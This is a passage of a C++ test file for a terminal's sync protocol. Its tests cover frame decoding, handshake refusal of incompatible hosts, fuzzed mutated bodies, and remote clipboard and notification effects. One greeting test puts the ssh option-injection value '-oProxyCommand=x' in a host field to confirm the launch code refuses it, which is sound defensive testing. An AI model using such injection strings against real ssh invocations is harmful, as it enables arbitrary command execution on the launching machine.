    const Control::CaptureTarget target { .pane = 7, .request = { .source = Control::CaptureSource::Rows, .start = 0, .end = 1000 } };
    const auto capture = Control::decodeCaptureReply(response, "capture.large", target);
    REQUIRE(capture.status == Control::CaptureReplyStatus::Complete);
    CHECK(capture.text == text);

    const auto body = canonicalBody(Sync::Result { .transfer = 0, .text = Codec::JSON::serialize(response) });
    std::vector<std::uint8_t> refused { 0xA5 };
    CHECK(!Sync::appendFrame(refused, Sync::FrameKind::Result, 0, body));
    CHECK(refused == std::vector<std::uint8_t> { 0xA5 });
    const auto bulk = Sync::decodeResult(canonicalBody(Sync::Result { .transfer = 11, .text = {} }));
    REQUIRE(bulk);
    CHECK_EQ(bulk->transfer, 11u);
    CHECK(bulk->text.empty());

    const auto maximum = canonicalBody(Sync::Result { .transfer = 0, .text = std::string(Sync::maxFrameBodyBytes - 1, 'r') });
    CHECK_EQ(maximum.size(), Sync::maxFrameBodyBytes);
    std::vector<std::uint8_t> frame;
    CHECK(Sync::appendFrame(frame, Sync::FrameKind::Result, 0, maximum));
    auto oversized = maximum;
    oversized.push_back('r');
    const auto before = frame;
    CHECK(!Sync::appendFrame(frame, Sync::FrameKind::Result, 0, oversized));
    CHECK(frame == before);
}

// Internally inconsistent bodies: take a valid rich body and flip each byte
// to 0xFF, then to 0x00, and apply. Across the sweep every count/width/kind
// field takes a hostile value. The contract under test: no crash, no hang — either a clean refusal
// or a benign apply.
TEST(testByteMutationSweeps)
{
    Ubiquitty::Terminal host;
    Ubiquitty::hardReset(host);
    Ubiquitty::resize(host, 10, 40);
    Ubiquitty::processBytes(&host, "mut \xe4\xb8\xad \xd8\xb3\xd9\x84\xd8\xa7\xd9\x85\r\n");
    // A ZWJ sequence overflows cellMaxCombining into the cluster pool, so the
    // body carries a cluster section for the sweep to corrupt.
    Ubiquitty::processBytes(&host, "\xf0\x9f\x91\xa9\xe2\x80\x8d\xf0\x9f\x9a\x80\r\n");
    // Fill the link ring: with all 64 slots live, a corrupted count walks past
    // the ring and the full-ring drop arm runs.
    for (int i = 0; i < 64; ++i) {
        char link[64];
        std::snprintf(link, sizeof link, "\033]8;;http://l%02d.example/\007x\033]8;;\007", i);
        Ubiquitty::processBytes(&host, link);
    }
    Ubiquitty::processBytes(&host, "\r\n\033]0;mut-title\007");
    Ubiquitty::processBytes(&host, "\033[2$~\033[1$}st\033[0$}");
    Ubiquitty::processBytes(&host, "\033[?1049halt");
    Ubiquitty::processBytes(&host, "\033_Ga=T,t=d,f=24,s=2,v=1,c=4,r=2,i=5;/wAAAAD/\033\\");
    Ubiquitty::processBytes(&host, "\033[1;2"); // half-fed CSI

    const auto sweep = [](const std::vector<uint8_t>& body, auto apply) {
        for (const uint8_t flip : { uint8_t { 0xFF }, uint8_t { 0x00 } })
            for (std::size_t i = 0; i < body.size(); ++i) {
                if (body[i] == flip)
                    continue;
                std::vector<uint8_t> mutated = body;
                mutated[i] = flip;
                apply(mutated);
            }
    };

    // The screen travels as a Sync checkpoint; a mutated one is refused
    // whole or applied whole, and the unmutated body still applies after.
    const std::vector<uint8_t> checkpoint = UbiquittyTest::checkpointBody(host);
    CHECK(!checkpoint.empty());
    Ubiquitty::Terminal client;
    Ubiquitty::hardReset(client);
    sweep(checkpoint, [&](const std::vector<uint8_t>& m) {
        Ubiquitty::Protocol::Sync::ScreenReplica replica;
        (void)Ubiquitty::Protocol::Sync::applyCheckpoint(client, m, replica);
    });
    Ubiquitty::Protocol::Sync::ScreenReplica replica;
    CHECK(Ubiquitty::Protocol::Sync::applyCheckpoint(client, checkpoint, replica) == Ubiquitty::Protocol::Sync::ApplyOutcome::Applied);
}

// Ingress retains one bounded body, not a carrier-sized burst or a history
// of consumed prefixes. A partial header survives between reads.
TEST(aDecoderBufferStaysBoundedByWhatIsPending)
{
    std::vector<std::uint8_t> burst;
    const std::vector<std::uint8_t> body(16, 'x');
    while (burst.size() < 512u * 1024u)
        REQUIRE(Sync::appendFrame(burst, Sync::FrameKind::Notify, 0, body));
    burst.push_back(std::to_underlying(Sync::FrameKind::Notify));
    burst.push_back(0);
    Sync::FrameIngress ingress(Sync::maxFrameBodyBytes);
    std::size_t drained = 0;
    const auto receive = [&](auto, std::span<const std::uint8_t> received) {
        CHECK(received.size() == body.size());
        ++drained;
        return Sync::FrameDelivery::Continue;
    };
    const auto consume = [&](std::span<const std::uint8_t> bytes) {
        return ingress.consume(bytes, admitCanonicalHeader, receive).state;
    };
    CHECK(consume(burst) == Sync::FrameIngress::State::Accepting);
    CHECK_MSG(drained > 10000, "the burst has to be many frames for the bound to mean anything");
    CHECK_EQ(ingress.pendingBytes(), 2u);
    CHECK_EQ(ingress.retainedBytes(), body.size());
    std::vector<std::uint8_t> tail { static_cast<std::uint8_t>(body.size()) };
    tail.insert(tail.end(), body.begin(), body.end());
    for (int round = 0; round < 8; ++round) {
        CHECK(consume(tail) == Sync::FrameIngress::State::Accepting);
        CHECK(consume(burst) == Sync::FrameIngress::State::Accepting);
        CHECK_EQ(ingress.pendingBytes(), 2u);
        CHECK_EQ(ingress.retainedBytes(), body.size());
    }
}

// A host refused at the handshake is refused for the rest of the connection.
//
// The version gate exists to refuse an incompatible host rather than mis-decode
// its frames, and leaving the session unestablished only closes the send side:
// nothing downstream reads whether the handshake was refused, so a peer whose
// Welcome was rejected can still put a title, a screen, scrollback, images
// and samples into the mirror. The refusal is the client's decision about the
// peer, not about the one frame that carried it.
//
// Reachable from a peer that is not the shipped daemon — a page pointed at a
// rogue ws:// endpoint, or a relay between — which is the peer the gate is for.
TEST(aHostRefusedAtTheHandshakeCannotWriteTheMirror)
{
    Ubiquitty::Terminal term;
    struct Observer final : SyncClientObserver {
        std::string title;
        int titleCount { 0 };
        bool isDenied { false };
        void onRefused(Ubiquitty::Protocol::Sync::ByeReason reason) override { isDenied = reason == Ubiquitty::Protocol::Sync::ByeReason::VersionMismatch; }
        void onPaneFacts(std::uint32_t, const Ubiquitty::Protocol::Sync::PaneFacts& facts) override
        {
            title = facts.programTitle;
            ++titleCount;
        }
    } observer;
    SyncClientCore core(&term, &observer);

    greetCore(core);
    auto refused = welcomeFixture();
    refused.wireVersion = Sync::wireVersion + 1;
    auto wire = canonicalFrame(Sync::FrameKind::Welcome, canonicalBody(refused));
    CHECK_MSG(!core.feed(std::as_bytes(std::span { wire.data(), wire.size() })),
        "premise: the frame that refuses a host ends the connection");
    CHECK_MSG(observer.isDenied, "premise: a host at another wire version is refused");
    CHECK_MSG(!core.sawHelloAck(), "premise: the refusal leaves the session unestablished");

    Ubiquitty::Protocol::Sync::PaneFacts facts;
    facts.revision = 1;
    facts.programTitle = "from a host this client refused";
    std::vector<std::uint8_t> body;
    Ubiquitty::Protocol::Sync::encodePaneFacts(body, facts);
    const auto titleFrame = canonicalFrame(Sync::FrameKind::PaneFacts, body, 1);
    CHECK_MSG(!core.feed(std::as_bytes(std::span { titleFrame.data(), titleFrame.size() })),
        "a refused host's next frame did not end the connection");
    CHECK_MSG(observer.titleCount == 0,
        "a refused host set the mirror's title");

    // And a reconnect is not wedged by the refusal: the same core, reset the way
    // a client resets it, takes a host it does not refuse.
    core.resetForReconnect();
    REQUIRE(welcomeCore(core));
    CHECK_MSG(core.sawHelloAck(), "a reset core did not take a compatible host");
    const auto bind = canonicalFrame(Sync::FrameKind::PaneBind, canonicalBody(Sync::PaneBind { .handle = 1, .paneID = { 7, 9 } }));
    REQUIRE(core.feed(std::as_bytes(std::span(bind))));
    CHECK(core.feed(std::as_bytes(std::span { titleFrame.data(), titleFrame.size() })));
    CHECK_MSG(observer.titleCount == 1 && observer.title == "from a host this client refused",
        "a host this client accepted could not set the mirror's title");
}

// A Greet is one canonical body: every field is on the wire whether or not it
// is set, so a short body is malformed rather than a peer that declined to
// say. What the remote-launch field authorizes is the launch policy's
// question, not the decoder's: a host string that would reach ssh as an option
// crosses the wire intact, and buildSSHArguments refuses it.
TEST(canonicalGreetingCarriesEverySelectionFieldAndRefusesEveryTruncation)
{
    auto greeting = greetingFixture();
    greeting.request = { .target = Sync::AdmissionTarget::Workspace, .sessionID = 0, .workspaceID = 0, .expectedDaemonInstanceID = 0x12345678ABCDEF01ULL, .workspaceName = "ubiquitty", .agentLabel = "router", .sshHost = "deploy@build-07.internal", .isAttachOnly = false, .endsWhenDetached = true, .servesClipboard = true };
    greeting.credential = std::vector<std::uint8_t> { 't', 'o', 'k' };
    const auto body = canonicalBody(greeting);
    const auto decoded = Sync::decodeGreet(body);
    REQUIRE(decoded);
    CHECK(decoded->request.target == Sync::AdmissionTarget::Workspace);
    CHECK(decoded->request.agentLabel == "router" && decoded->credential == greeting.credential);
    CHECK(decoded->request.sshHost == greeting.request.sshHost);
    CHECK(decoded->request.workspaceName == "ubiquitty" && decoded->request.endsWhenDetached && decoded->request.servesClipboard);
    CHECK(decoded->request.expectedDaemonInstanceID == greeting.request.expectedDaemonInstanceID);
    for (std::size_t cut = 0; cut < body.size(); ++cut)
        CHECK(!Sync::decodeGreet(std::span(body).first(cut)));
    auto pinned = greeting;
    pinned.request.workspaceID = 91;
    pinned.request.sessionID = 12;
    pinned.request.isAttachOnly = true;
    pinned.request.sshHost.clear();
    const auto pin = Sync::decodeGreet(canonicalBody(pinned));
    CHECK(pin && pin->request.workspaceID == 91 && pin->request.sessionID == 12 && pin->request.isAttachOnly);
    auto hostile = greetingFixture();
    hostile.request.sshHost = "-oProxyCommand=x";
    const auto hostileOut = Sync::decodeGreet(canonicalBody(hostile));
    CHECK(hostileOut && hostileOut->request.sshHost == "-oProxyCommand=x");
    CHECK(hostileOut && Network::buildSSHArguments("ssh", hostileOut->request.sshHost).empty());
    CHECK(!Network::buildSSHArguments("ssh", decoded->request.sshHost).empty());
}

// A Welcome names the workspace and the daemon instance a connection is
// bound to in every body.
TEST(canonicalWelcomeCarriesItsWorkspaceAndInstance)
{
    auto welcome = welcomeFixture(12, 0x12345678ABCDEF01ULL);
    welcome.selection.target = Sync::AdmissionTarget::Workspace;
    welcome.selection.socketName = "host-ab.sock";
    welcome.selection.workspaceID = 99;
    const auto body = canonicalBody(welcome);
    const auto decoded = Sync::decodeWelcome(body);
    CHECK(decoded && decoded->selection.workspaceID == 99 && decoded->selection.daemonInstanceID == welcome.selection.daemonInstanceID);
    CHECK(decoded && decoded->selection.socketName == "host-ab.sock");
    for (std::size_t cut = 0; cut < body.size(); ++cut)
        CHECK(!Sync::decodeWelcome(std::span(body).first(cut)));
}

TEST(typedListingPreservesDirectoryFieldsAndRefusesStructureTruncation)
{
    const auto workspace = listingWorkspaceFixture();
    std::vector<std::uint8_t> body;
    REQUIRE(Session::encodeWorkspaceStructure(body, workspace));
    const auto structure = Session::decodeWorkspaceStructure(body);
    REQUIRE(structure);
    for (std::size_t cut = 0; cut < body.size(); ++cut)
        CHECK(!Session::decodeWorkspaceStructure(std::span(body).first(cut)));
    Sync::PaneFacts facts;
    facts.revision = 1;
    facts.rows = 24;
    facts.columns = 80;
    facts.programTitle = "t";
    facts.currentDirectory = "/d";
    facts.foreground.name = "sh";
    facts.isAtPrompt = true;
    std::vector<std::uint8_t> record;
    Sync::encodePaneFacts(record, facts);
    const auto decodedFacts = Sync::decodePaneFacts(record);
    REQUIRE(decodedFacts);
    const auto tree = Session::assembleSessionTree(std::span(&*structure, 1), 6, 1000, [&](Sync::ID128 paneID) {
        CHECK(paneID == (Sync::ID128 { 17, 19 }));
        return Session::HeldPaneRecords { .facts = &*decodedFacts, .status = nullptr };
    });
    const auto rows = Session::sessionRows(tree);
    REQUIRE(rows.size() == 1);
    const auto& first = rows.front();
    CHECK(first.id == 7 && first.columns == 80 && first.rows == 24 && first.isAtPrompt());
    CHECK(first.title == "t" && first.currentDirectory == "/d" && first.foregroundProcess == "sh");
    CHECK(first.workspaceID == 5 && first.workspaceName == "ubiquitty");
    CHECK(first.attendeeCount == 3 && first.humanAttendeeCount == 2);
    CHECK(first.label == "build" && first.windowID == 9 && first.windowLabel == "main");
    CHECK(first.tabID == 10 && first.tabTitle == "Tab — 日本語" && first.paneID == 11 && first.paneLabel == "logs");
    CHECK(Session::sessionRows(Session::SessionTree {}).empty());
}

TEST(aHandshakeRequestSendsOneCanonicalGreeting)
{
    using namespace Ubiquitty::Protocol;
    for (const std::string& label : { std::string {}, std::string { "helper" } }) {
        HandshakeRequest request;
        request.columns = 137;
        request.rows = 43;
        request.agentLabel = label;
        request.authToken = "test-token";
        SyncClientCore core(nullptr, nullptr);
        core.setClock([] { return 1; });
        std::vector<std::uint8_t> output;
        core.buildHello(request, output);

        Sync::FrameDecoder screenDecoder;
        screenDecoder.append(output);
        const auto frame = screenDecoder.next();
        CHECK(frame && frame->kind == Sync::FrameKind::Greet);
        if (!frame)
            continue;
        const auto greeting = Sync::decodeGreet(frame->body);
        const std::optional expectedCredential { std::vector<std::uint8_t> { 't', 'e', 's', 't', '-', 't', 'o', 'k', 'e', 'n' } };
        CHECK(greeting && greeting->facts.viewportColumns == 137 && greeting->facts.viewportRows == 43);
        CHECK(greeting && greeting->request.agentLabel == label);
        CHECK(greeting && greeting->request.target == Sync::AdmissionTarget::Session);
        CHECK(greeting && greeting->credential == expectedCredential);
        CHECK(greeting && greeting->clientKind == (label.empty() ? Sync::ClientKind::Human : Sync::ClientKind::Agent));
        CHECK(greeting && greeting->wireVersion == Sync::wireVersion);
        CHECK(!screenDecoder.next());
    }
}

TEST(aGreetingOffersFacesOnlyWhenItsRendererDrawsProportionalRuns)
{
    auto terminal = std::make_unique<Terminal>();
    SyncClientCore core(terminal.get(), nullptr);
    core.setClock([] { return 1; });
    for (const bool drawsRuns : { false, true, false }) {
        terminal->drawsProportionalText = drawsRuns;
        std::vector<std::uint8_t> output;
        core.buildHello(HandshakeRequest {}, output);
        Sync::FrameDecoder decoder;
        decoder.append(output);
        const auto frame = decoder.next();
        REQUIRE(frame && frame->kind == Sync::FrameKind::Greet);
        const auto greeting = Sync::decodeGreet(frame->body);
        REQUIRE(greeting);
        CHECK_EQ(greeting->capabilities.contains(ClientCapability::PublishesFaces), drawsRuns);
    }
}

TEST(aControlHandshakeRequestUsesAnUnboundCanonicalGreeting)
{
    for (const bool isManagement : { false, true }) {
        HandshakeRequest request;
        request.target = HandshakeTarget::Control;
        request.intents.set(HelloIntent::RequestsManagement, isManagement);
        SyncClientCore core(nullptr, nullptr);
        core.setClock([] { return 1; });
        std::vector<std::uint8_t> output;
        core.buildHello(request, output);
        Ubiquitty::Protocol::Sync::FrameDecoder decoder;
        decoder.append(output);
        const auto frame = decoder.next();
        CHECK(frame && frame->kind == Ubiquitty::Protocol::Sync::FrameKind::Greet);
        if (!frame)
            continue;
        const auto greeting = Ubiquitty::Protocol::Sync::decodeGreet(frame->body);
        CHECK(greeting && !greeting->request.sessionID && !greeting->request.workspaceID && !greeting->resume);
        CHECK(greeting && !greeting->capabilities.contains(ClientCapability::PublishesFaces));
        CHECK(greeting && greeting->request.target == (isManagement ? Ubiquitty::Protocol::Sync::AdmissionTarget::Management : Ubiquitty::Protocol::Sync::AdmissionTarget::Control));
        CHECK(!decoder.next());
    }
}

TEST(aClientReadsAnOversizeRefusalBeforeWelcome)
{
    using namespace Ubiquitty::Protocol;
    struct Observer final : SyncClientObserver {
        int refusals = 0;
        Sync::ByeReason reason = Sync::ByeReason::Normal;
        void onRefused(Sync::ByeReason value) override
        {
            ++refusals;
            reason = value;
        }
    };
    for (const auto reason : { Sync::ByeReason::Oversize, Sync::ByeReason::TransferRefused }) {
        Observer observer;
        SyncClientCore core(nullptr, &observer);
        core.setClock([] { return 1; });
        std::vector<std::uint8_t> greeting;
        HandshakeRequest request;
        core.buildHello(request, greeting);
        std::vector<std::uint8_t> body;
        Sync::encode(body, Sync::Bye { .reason = reason, .detail = {} });
        std::vector<std::uint8_t> frame;
        CHECK(Sync::appendFrame(frame, Sync::FrameKind::Bye, 0, body));
        CHECK(!core.feed(std::as_bytes(std::span { frame })));
        CHECK(observer.refusals == 1 && observer.reason == reason);
        CHECK(!core.sawHelloAck());
        CHECK(core.faulted());
        CHECK(!core.feed(std::as_bytes(std::span { frame })));
        CHECK(observer.refusals == 1);
    }
}

TEST(aTransportFailureAfterWelcomeIsNotReportedAsAnAdmissionRefusal)
{
    using namespace Ubiquitty::Protocol;
    struct Observer final : SyncClientObserver {
        int refusals = 0;
        void onRefused(Sync::ByeReason) override { ++refusals; }
    };
    for (const auto reason : { Sync::ByeReason::Oversize, Sync::ByeReason::TransferRefused }) {
        Observer observer;
        SyncClientCore core(nullptr, &observer);
        core.setClock([] { return 1; });
        std::vector<std::uint8_t> greeting;
        core.buildHello(HandshakeRequest {}, greeting);
        const auto welcome = welcomeFixture();
        std::vector<std::uint8_t> body;
        Sync::encode(body, welcome);
        std::vector<std::uint8_t> frame;
        REQUIRE(Sync::appendFrame(frame, Sync::FrameKind::Welcome, 0, body));
        REQUIRE(core.feed(std::as_bytes(std::span { frame })));
        REQUIRE(core.screen() && core.screen()->welcome());
        body.clear();
        Sync::encode(body, Sync::Bye { .reason = reason, .detail = {} });
        frame.clear();
        REQUIRE(Sync::appendFrame(frame, Sync::FrameKind::Bye, 0, body));
        CHECK(!core.feed(std::as_bytes(std::span { frame })));
        CHECK_EQ(observer.refusals, 0);
        CHECK(!core.feed(std::as_bytes(std::span { frame })));
        CHECK_EQ(observer.refusals, 0);
    }
}

TEST(typedPaneEffectsPreserveNotificationFieldsAndPostOnlyAtTheirPrimary)
{
    using namespace Ubiquitty::Protocol;
    struct Observer final : SyncClientObserver {
        unsigned bells = 0;
        unsigned attention = 0;
        unsigned notifications = 0;
        std::string title;
        std::string body;
        std::string identifier;
        NotificationOccasion occasion = NotificationOccasion::Always;
        struct Command {
            std::int32_t exitStatus = 0;
            std::uint64_t generation = 0;
            std::uint64_t sequence = 0;
            std::uint64_t durationMicroseconds = 0;
            Sync::ID128 primary;
            Sync::EffectKind kind = Sync::EffectKind::Bell;
            Sync::EffectDisposition disposition = Sync::EffectDisposition::Badge;
            std::string currentDirectory;
            std::string commandLine;
        };
        std::vector<Command> commands;
        void onBell() override { ++bells; }
        void onAttention() override { ++attention; }
        void onNotificationRequest(const NotificationRequest& request) override
        {
            ++notifications;
            title = request.title;
            body = request.body;
            identifier = request.identifier;
            occasion = request.occasion;
        }
        void onCommandDone(const Sync::EffectView& effect, const Sync::CommandFinishedEffect& command, Sync::EffectDisposition disposition) override
        {
            commands.push_back({ .exitStatus = command.exitStatus, .generation = effect.generation, .sequence = effect.sequence, .durationMicroseconds = command.durationMicroseconds, .primary = effect.primary, .kind = effect.kind, .disposition = disposition, .currentDirectory = std::string(command.currentDirectory), .commandLine = std::string(command.commandLine) });
        }
    } observer;
    SyncClientCore core(nullptr, &observer);
    // Delivery itself, from a host whose admission stands; what a host on
    // another machine may deliver is the client policy's, below.
    core.setHostLocation(Sync::HostLocation::ThisMachine);
    REQUIRE(welcomeCore(core));
    Sync::EffectView effect { .paneID = { .low = 7, .high = 9 }, .generation = 19, .sequence = 1, .primary = { 3, 4 }, .kind = Sync::EffectKind::Notification, .count = 1, .target = 0, .payload = {} };
    const Sync::EffectBody notification = Sync::NotificationEffect { "Title", "Body", "replacement", NotificationOccasion::Invisible };
    for (auto disposition : { Sync::EffectDisposition::Badge, Sync::EffectDisposition::Ignore }) {
        core.receivePaneEffect(effect, notification, disposition);
        core.receivePaneEffect(effect, Sync::BellEffect {}, disposition);
        core.receivePaneEffect(effect, Sync::AttentionEffect {}, disposition);
    }
    CHECK_EQ(observer.notifications, 0u);
    CHECK_EQ(observer.bells, 0u);
    CHECK_EQ(observer.attention, 0u);
    core.receivePaneEffect(effect, notification, Sync::EffectDisposition::Post);
    CHECK_EQ(observer.notifications, 1u);
    CHECK(observer.title == "Title" && observer.body == "Body" && observer.identifier == "replacement");
    CHECK(observer.occasion == NotificationOccasion::Invisible);
    core.receivePaneEffect(effect, Sync::BellEffect {}, Sync::EffectDisposition::Post);
    core.receivePaneEffect(effect, Sync::AttentionEffect {}, Sync::EffectDisposition::Post);
    CHECK_EQ(observer.bells, 1u);
    CHECK_EQ(observer.attention, 1u);

    // Ignore is an agent's posting disposition, not refusal of readable command state.
    effect.kind = Sync::EffectKind::CommandFinished;
    core.receivePaneEffect(effect, Sync::CommandFinishedEffect { .exitStatus = -17, .durationMicroseconds = 42, .currentDirectory = "/work", .commandLine = "false" }, Sync::EffectDisposition::Ignore);
    REQUIRE(observer.commands.size() == 1);
    CHECK_EQ(observer.commands.front().exitStatus, -17);
    CHECK_EQ(observer.commands.front().generation, 19u);
    CHECK_EQ(observer.commands.front().sequence, 1u);
    CHECK_EQ(observer.commands.front().durationMicroseconds, 42u);
    CHECK(observer.commands.front().primary == effect.primary);
    CHECK(observer.commands.front().kind == Sync::EffectKind::CommandFinished);
    CHECK(observer.commands.front().disposition == Sync::EffectDisposition::Ignore);
    CHECK(observer.commands.front().currentDirectory == "/work" && observer.commands.front().commandLine == "false");

    effect.kind = Sync::EffectKind::Notification;
    {
        const std::string title("A\0B", 3);
        const std::string body("C\0D", 3);
        const std::string identifier = "owned-replacement";
        const Sync::EffectBody borrowed = Sync::NotificationEffect { title, body, identifier, NotificationOccasion::Unfocused };
        core.receivePaneEffect(effect, borrowed, Sync::EffectDisposition::Post);
    }
    // The callback borrows its fields; queued presentation copies the exact
    // lengths and keeps replacement/occasion after their source has died.
    CHECK_EQ(observer.notifications, 2u);
    CHECK(observer.title == std::string("A\0B", 3));
    CHECK(observer.body == std::string("C\0D", 3));
    CHECK(observer.identifier == "owned-replacement");
    CHECK(observer.occasion == NotificationOccasion::Unfocused);
    ++effect.paneID.low;
    core.receivePaneEffect(effect, notification, Sync::EffectDisposition::Post);
    --effect.paneID.low;
    ++effect.paneID.high;
    core.receivePaneEffect(effect, notification, Sync::EffectDisposition::Post);
    --effect.paneID.high;
    core.resetForReconnect();
    core.receivePaneEffect(effect, notification, Sync::EffectDisposition::Post);
    CHECK_EQ(observer.notifications, 2u);
}

TEST(typedClipboardWritesBorrowExactItemsOnlyForTheSelectedPane)
{
    using namespace Ubiquitty::Protocol;
    struct Observer final : SyncClientObserver {
        unsigned writes = 0;
        ClipboardBuffer buffer = ClipboardBuffer::Clipboard;
        const char* expectedData = nullptr;
        std::vector<std::pair<std::string, std::string>> items;
        void onClipboardWriteItems(ClipboardBuffer destination, std::span<const ClipboardItem> borrowed) override
        {
            ++writes;
            buffer = destination;
            if (!borrowed.empty())
                CHECK(borrowed.front().bytes.data() == expectedData);
            items.clear();
            for (const auto& item : borrowed)
                items.emplace_back(item.mime, std::string(item.bytes.data(), item.bytes.size()));
        }
    } observer;
    SyncClientCore core(nullptr, &observer);
    core.setHostLocation(Sync::HostLocation::ThisMachine);
    REQUIRE(welcomeCore(core));
    Sync::EffectView effect { .paneID = { .low = 7, .high = 9 }, .generation = 19, .sequence = 1, .primary = { 3, 4 }, .kind = Sync::EffectKind::ClipboardWrite, .count = 1, .target = std::to_underlying(ClipboardBuffer::Cut3), .payload = {} };
    {
        const std::array<std::uint8_t, 3> binary { 'a', 0, 'b' };
        Sync::EffectClipboardBundle bundle;
        bundle.count = 2;
        bundle.items[0] = { "text/plain", binary };
        bundle.items[1] = { "application/octet-stream", binary };
        const auto encoded = Sync::encodeEffectClipboard(bundle, Sync::maxEffectClipboardWriteBytes);
        REQUIRE(encoded);
        const auto decoded = Sync::decodeEffectClipboard(encoded->view(), Sync::maxEffectClipboardWriteBytes);
        REQUIRE(decoded);
        observer.expectedData = reinterpret_cast<const char*>(decoded->items[0].data.data());
        const Sync::EffectBody body = Sync::ClipboardWriteEffect { ClipboardBuffer::Cut3, { .transfer = 0, .encodedBytes = static_cast<std::uint32_t>(encoded->size), .inlineBytes = encoded->view() } };
        for (const auto disposition : { Sync::EffectDisposition::Badge, Sync::EffectDisposition::Ignore })
            core.receivePaneEffect(effect, body, disposition);
        CHECK_EQ(observer.writes, 0u);
        ++effect.paneID.low;
        core.receivePaneEffect(effect, body, Sync::EffectDisposition::Post);
        --effect.paneID.low;
        ++effect.paneID.high;
        core.receivePaneEffect(effect, body, Sync::EffectDisposition::Post);
        --effect.paneID.high;
        CHECK_EQ(observer.writes, 0u);
        core.receivePaneEffect(effect, body, Sync::EffectDisposition::Post);
    }
    // An observer that queues work must own its bytes once the admitted body
    // returns. The synchronous callback itself borrowed the exact payload.
    CHECK_EQ(observer.writes, 1u);
    CHECK(observer.buffer == ClipboardBuffer::Cut3);
    REQUIRE(observer.items.size() == 2);
    CHECK(observer.items[0].first == "text/plain");
    CHECK(observer.items[1].first == "application/octet-stream");
    CHECK(observer.items[0].second == std::string("a\0b", 3));
    CHECK(observer.items[1].second == observer.items[0].second);

    const auto clear = Sync::encodeEffectClipboard({}, Sync::maxEffectClipboardWriteBytes);
    REQUIRE(clear);
    const Sync::EffectBody body = Sync::ClipboardWriteEffect { ClipboardBuffer::Cut3, { .transfer = 0, .encodedBytes = static_cast<std::uint32_t>(clear->size), .inlineBytes = clear->view() } };
    core.receivePaneEffect(effect, body, Sync::EffectDisposition::Post);
    CHECK_EQ(observer.writes, 2u);
    CHECK(observer.items.empty());
    core.resetForReconnect();
    core.receivePaneEffect(effect, body, Sync::EffectDisposition::Post);
    CHECK_EQ(observer.writes, 2u);
}

namespace {

/// Records what a client applied of its host's effects, and what it held.
struct HostEffectObserver final : SyncClientObserver {
    std::vector<std::string> writes;
    std::vector<ClipboardBuffer> buffers;
    std::vector<std::string> notifications;
    std::vector<std::pair<std::uint64_t, Ubiquitty::Capability>> held;
    void onClipboardWriteItems(ClipboardBuffer buffer, std::span<const ClipboardItem> items) override
    {
        buffers.push_back(buffer);
        writes.emplace_back(items.empty() ? std::string() : std::string(items.front().bytes.data(), items.front().bytes.size()));
    }
    void onNotificationRequest(const NotificationRequest& request) override { notifications.emplace_back(request.title); }
    void onAttention() override { ++attention; }
    void onHostEffectHeld(std::uint64_t token, Ubiquitty::Capability capability) override { held.emplace_back(token, capability); }
    void onHostEffectWithdrawn(std::uint64_t token, Ubiquitty::Protocol::Sync::HostEffectWithdrawal reason) override
    {
        withdrawn.push_back(token);
        if (reason == Ubiquitty::Protocol::Sync::HostEffectWithdrawal::ConnectionEnded && core)
            didSeeHeldEffectWhileEnding = didSeeHeldEffectWhileEnding || core->oldestHeldHostEffect().has_value();
    }
    const SyncClientCore* core = nullptr;
    bool didSeeHeldEffectWhileEnding = false;
    unsigned attention = 0;
    std::vector<std::uint64_t> withdrawn;
};

/// The pane the welcome fixture binds, as a posted effect names it.
Ubiquitty::Protocol::Sync::EffectView postedEffect(Ubiquitty::Protocol::Sync::EffectKind kind)
{
    return { .paneID = { .low = 7, .high = 9 }, .generation = 19, .sequence = 1, .primary = { 3, 4 }, .kind = kind, .count = 1, .target = 0, .payload = {} };
}

/// Delivers a host's clipboard write of one text item, from bytes that die
/// when the call returns.
void deliverHostClipboardWrite(SyncClientCore& core, std::string_view text, ClipboardBuffer buffer = ClipboardBuffer::Clipboard, std::uint64_t sequence = 1)
{
    namespace Sync = Ubiquitty::Protocol::Sync;
    const std::vector<std::uint8_t> bytes(text.begin(), text.end());
    Sync::EffectClipboardBundle bundle;
    bundle.count = 1;
    bundle.items[0] = { "text/plain", bytes };
    const auto encoded = Sync::encodeEffectClipboard(bundle, Sync::maxEffectClipboardWriteBytes);
    REQUIRE(encoded);
    const Sync::EffectBody body = Sync::ClipboardWriteEffect { buffer, { .transfer = 0, .encodedBytes = static_cast<std::uint32_t>(encoded->size), .inlineBytes = encoded->view() } };
    auto effect = postedEffect(Sync::EffectKind::ClipboardWrite);
    effect.target = std::to_underlying(buffer);
    effect.sequence = sequence;
    core.receivePaneEffect(effect, body, Sync::EffectDisposition::Post);
}

/// Delivers a host's notification whose title dies when the call returns.
void deliverHostNotification(SyncClientCore& core, std::string_view title)
{
    namespace Sync = Ubiquitty::Protocol::Sync;
    const std::string owned(title);
    core.receivePaneEffect(postedEffect(Sync::EffectKind::Notification), Sync::NotificationEffect { owned, "body", "", NotificationOccasion::Always }, Sync::EffectDisposition::Post);
}

/// The sounds the client played for its host, with each one's sample.
struct PlayedTones {
    int calls = 0;
    std::vector<std::int16_t> lastSample;
};
PlayedTones playedTones;
void recordPlayedTones(const Ubiquitty::PAL::PlayTonesRequest& request)
{
    ++playedTones.calls;
    playedTones.lastSample.assign(request.samplePCM, request.samplePCM ? request.samplePCM + request.sampleFrames : nullptr);
}

/// A decision source over a table a case changes as it goes.
Ubiquitty::Protocol::Sync::SyncClientCore::HostEffectDecisionSource decisionsFrom(const Ubiquitty::CapabilityDecisionTable& table)
{
    return [&table](Ubiquitty::Capability capability) { return table.decision(Ubiquitty::CapabilityOrigin::Remote, capability); };
}

/// The table that gives the Remote origin's host-escaping tier one verdict.
Ubiquitty::CapabilityDecisionTable remoteHostEscaping(Ubiquitty::CapabilityDecision decision)
{
    return Ubiquitty::CapabilityDecisionTable {}.replacing(Ubiquitty::CapabilityOrigin::Remote, Ubiquitty::CapabilityTier::HostEscaping, decision);
}

} // namespace

// A host on another machine delivers a clipboard write its own policy admitted.
// The client does not take the host's word for it: its own Remote-origin
// verdict, Prompt by default, holds the write for the person, and only their
// answer applies it. The held write owns its bytes, so the answer applies what
// the host sent after the frame that carried it is gone.
TEST(aClipboardWriteFromAHostOnAnotherMachineIsHeldForThePersonsAnswer)
{
    using namespace Ubiquitty::Protocol;
    HostEffectObserver observer;
    SyncClientCore core(nullptr, &observer);
    REQUIRE(welcomeCore(core));
    CHECK(core.hostLocation() == Sync::HostLocation::AnotherMachine);

    deliverHostClipboardWrite(core, "first");
    CHECK_MSG(observer.writes.empty(), "a remote host's clipboard write reached the clipboard without the person's answer");
    REQUIRE(observer.held.size() == 1);
